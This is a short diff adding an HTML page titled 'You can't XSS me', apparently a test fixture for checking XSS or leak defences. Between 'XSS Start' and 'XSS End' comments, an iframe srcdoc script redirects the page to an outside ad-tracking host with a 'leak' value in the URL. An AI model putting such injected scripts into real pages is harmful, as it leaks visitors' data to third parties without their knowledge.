@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>You can't XSS me</title>
+  </head>
+  <body>
+    <!--  XSS Start -->
+    <iframe srcdoc="<script> location.href = 'https://adition.com/report/?leak=c1001283'</script>"></iframe>
+    <!-- XSS End -->
+  </body>
+</html>
